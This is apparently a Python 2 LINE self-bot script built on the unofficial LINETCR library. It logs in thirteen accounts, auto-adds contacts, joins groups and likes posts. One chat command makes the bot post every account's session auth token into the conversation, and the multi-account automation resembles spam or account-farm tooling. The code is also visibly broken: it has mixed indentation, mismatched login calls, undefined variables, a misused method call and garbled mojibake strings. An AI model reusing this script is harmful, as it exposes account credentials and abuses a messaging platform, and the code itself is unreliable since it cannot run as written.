# -*- coding: utf-8 -*-
import LINETCR
from LINETCR.lib.curve.ttypes import *
from datetime import datetime
import time,random,sys,json,codecs,threading,glob

cl = LINETCR.LINE() 
cl.login(qr=True)
cl.loginResult()

ad = LINETCR.LINE()
ad.login(qr=True)
ad.loginResult()

ki = LINETCR.LINE()
ki.login(qr=True)
ki.loginResult()

kk = LINETCR.LINE()
kk.login(qr=True)
kk.loginResult()

kc = LINETCR.LINE()
kc.login(qr=True)
kc.loginResult()

kd = LINETCR.LINE()
kd.login(qr=True)
kd.loginResult()

ke = LINETCR.LINE()
ke.login(qr=True)
ke.loginResult()

kf = LINETCR.LINE()
kf.login(qr=True)
kf.loginResult()

kg = LINETCR.LINE()
kg.login(qr=True)
kg.loginResult()

kh = LINETCR.LINE()
kh.login(qr=True)
kh.loginResult()

kj = LINETCR.LINE()
kj.login(qr=True)
kj.loginResult()

kl = LINETCR.LINE()
kl.login(qr=True)
ki.loginResult()

kn = LINETCR.LINE()
kn.login(qr=True)
kn.loginResult()

print "login success"
reload(sys)
sys.setdefaultencoding('utf-8')

helpMessage ="""[Help 不給看勒]"""
KAC=[cl,ki,kk,kc,kd,ke,kf,kg,kh,kj,kl,kn,ad]
admid = ad.getProfile().mid
mid = cl.getProfile().mid
Amid = ki.getProfile().mid
Bmid = kk.getProfile().mid
Cmid = kc.getProfile().mid
Dmid = kd.getProfile().mid
Emid = ke.getProfile().mid
Fmid = kf.getProfile().mid
Gmid = kg.getProfile().mid
Hmid = kh.getProfile().mid
Jmid = kj.getProfile().mid
Lmid = kl.getProfile().mid
Nmid = kn.getProfile().mid
Bots=[mid,Amid,Bmid,Cmid,Dmid,Emid,Fmid,Gmid,Hmid,Jmid,Lmid,Nmid,admid]
admin = ["u67c43239c865dfce6addb41c6b3c0edd","u29971676114806a574c148f0df876c22","u24d44be70c40b45eaee0818821bee579","u21447be3cb92d496053e457839782575","u76b191d82b5711e21d6ad7ad94633a7f","u15d79462d65d82a32014fe022a9b8a3c","ud17c64969005f01e96688c73756f9990","u0bbe04d5f886bc841a37b92db837afc2","u67c43239c865dfce6addb41c6b3c0edd","u7d8710559bda136ae7030477f83069df","u1357c6b878778ce5f378580ed29af969","u21d3aa810af9563115cdc2c795638fa7","u49430efdfd2fd2d89b47f36744b8c634","ud13824d0cea59b050419efd786725990"]

adminMID = "ua5246fb6c9e7fce0cf982776298b709b","u4c10b3d699545a706d87eb8002ac49c5","u67c43239c865dfce6addb41c6b3c0edd","u29971676114806a574c148f0df876c22","u24d44be70c40b45eaee0818821bee579","u21447be3cb92d496053e457839782575","u76b191d82b5711e21d6ad7ad94633a7f","u15d79462d65d82a32014fe022a9b8a3c","ud17c64969005f01e96688c73756f9990","u0bbe04d5f886bc841a37b92db837afc2"
wait = {
    'protect':False,
    'protectinv':False,
    'protectqr':False,
    'contact':True,
    'autoJoin':True,
    'autoCancel':{"on":True,"members":1},
    'leaveRoom':False,
    'timeline':True,
    'autoAdd':True,
    'message':"Thanks for add me",
    "lang":"JP",
    "comment":"Thanks for add me",
    "commentOn":False,
    "commentBlack":{},
    "wblack":False,
    "dblack":False,
    "clock":False,
    "cName":"𝛓𝜄•A•ˢˡᵒʷᵉʳ ᵇᵒᵗ ",
    "blacklist":{},
    "wblacklist":False,
    "dblacklist":False,
    "protectionOn":False
    }

wait2 = {
    'readPoint':{},
    'readMember':{},
    'setTime':{},
    'ROM':{}
    }

setTime = {}
setTime = wait2['setTime']


def sendMessage(to, text, contentMetadata={}, contentType=0):
    mes = Message()
    mes.to, mes.from_ = to, profile.mid
    mes.text = text
    mes.contentType, mes.contentMetadata = contentType, contentMetadata
    if to not in messageReq:
        messageReq[to] = -1
    messageReq[to] += 1

def NOTIFIED_READ_MESSAGE(op):
  if op.type == 55:
    try:
        if op.param1 in wait2['readPoint']:
            Name = cl.getContact(op.param1).displayName
            if Name in wait2['readMember'][op.param1]:
                pass
            else:
                wait2['readMember'][op.param1] += "\nツ1�71ￄ1�771ￄ1�71ￄ1�7771ￄ1�71ￄ1�771ￄ1�71ￄ1�7777" + Name
                wait2['ROM'][op.param1][op.param2] = "ツ1�71ￄ1�771ￄ1�71ￄ1�7771ￄ1�71ￄ1�771ￄ1�71ￄ1�7777" + Name
        else:
            cl.sendText
    except:
        pass

def bot(op):
    try:
        if op.type == 0:
            return
#-----------
        if op.type == 5:
            if wait["autoAdd"] == True:
                cl.findAndAddContactsByMid(op.param1)
                if (wait["message"] in [""," ","\n",None]):
                    pass
                else:
                    cl.sendText(op.param1,str(wait["message"]))
#-----------------------------------------------------


        if op.type == 22:
            if wait["leaveRoom"] == True:
                cl.leaveRoom(op.param1)
        if op.type == 24:
            if wait["leaveRoom"] == True:
                cl.leaveRoom(op.param1)
        if op.type == 26:
            msg = op.message
            if msg.toType == 0:
                msg.to = msg.from_
                if msg.from_ == profile.mid:
                    if "join:" in msg.text:
                        list_ = msg.text.split(":")
                        try:
                            cl.acceptGroupInvitationByTicket(list_[1],list_[2])
                            X = cl.getGroup(list_[1])
                            X.preventJoinByTicket = True
                            cl.updateGroup(X)
                        except:
                            cl.sendText(msg.to,"error")
            if msg.toType == 1:
                if wait["leaveRoom"] == True:
                    cl.leaveRoom(msg.to)
            if msg.contentType == 16:
                url = msg.contentMetadata("line://home/post?userMid="+mid+"&postId="+"new_post")
                cl.like(url[25:58], url[66:], likeType=1001)
        if op.type == 26:
            msg = op.message
            if msg.contentType == 13:
               if wait["wblack"] == True:
                    if msg.contentMetadata["mid"] in wait["commentBlack"]:
                        cl.sendText(msg.to,"already")
                        wait["wblack"] = False
                    else:
                        wait["commentBlack"][msg.contentMetadata["mid"]] = True
                        wait["wblack"] = False
                        cl.sendText(msg.to,"decided not to comment")
            elif msg.text in ["鑰匙"]:
              if msg.from_ in admin:
              	cl.sendText(msg.to,cl.authToken)
                  cl.sendText(msg.to,ad.authToken)
                  cl.sendText(msg.to,ki.authToken)
                  cl.sendText(msg.to,kk.authToken)
                  cl.sendText(msg.to,kc.authToken)
                  cl.sendText(msg.to,kd.authToken)
                  cl.sendText(msg.to,ke.authToken)
                  cl.sendText(msg.to,kf.authToken)
                  cl.sendText(msg.to,kg.authToken)
                  cl.sendText(msg.to,kh.authToken)
                  cl.sendText(msg.to,kj.authToken)
                  cl.sendText(msg.to,kl.authToken)
                  cl.sendText(msg.to,kn.authToken)
        if op.type == 59:
            print op


    except Exception as error:
        print error


def a2():
    now2 = datetime.now()
    nowT = datetime.strftime(now2,"%M")
    if nowT[14:] in ["10","20","30","40","50","00"]:
        return False
    else:
        return True

def nameUpdate():
    while True:
        try:
        #while a2():
            #pass
            if wait["clock"] == True:
                now2 = datetime.now()
                nowT = datetime.strftime(now2,"(%H:%M)")
                profile = cl.getProfile()
                profile.displayName = wait["cName"] + nowT
                cl.updateProfile(profile)
            time.sleep(600)
        except:
            pass
thread2 = threading.Thread(target=nameUpdate)
thread2.daemon = True
thread2.start()

#def autolike():
#    for zx in range(0,20):
#        hasil = cl.activity(limit=20)
#    if hasil['result']['posts'][zx]['postInfo']['liked'] == False:
#        try: 
#            cl.like(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],likeType=1002)
#            cl.comment(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],"Auto Like by ㄩㄗ大神")            ki.like(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],likeType=1002)
#            kk.like(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],likeType=1002)
#            kc.like(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],likeType=1002)
#            kd.like(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],likeType=1002)
#            ke.like(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],likeType=1002)
#            kf.like(hasil['result']['posts'][zx]['userInfo']['mid'],hasil['result']['posts'][zx]['postInfo']['postId'],likeType=1002)
#            print "Like"
#        except:
#            pass
#    else:
#        print "Already Liked"
#        time.sleep(5000)
#thread2 = threading.Thread(target=autolike)
#thread2.daemon = True
#thread2.start()

while True:
    try:
        Ops = cl.fetchOps(cl.Poll.rev, 5)
    except EOFError:
        raise Exception("It might be wrong revision\n" + str(cl.Poll.rev))

    for Op in Ops:
        if (Op.type != OpType.END_OF_OPERATION):
            cl.Poll.rev = max(cl.Poll.rev, Op.revision)
            bot(Op)
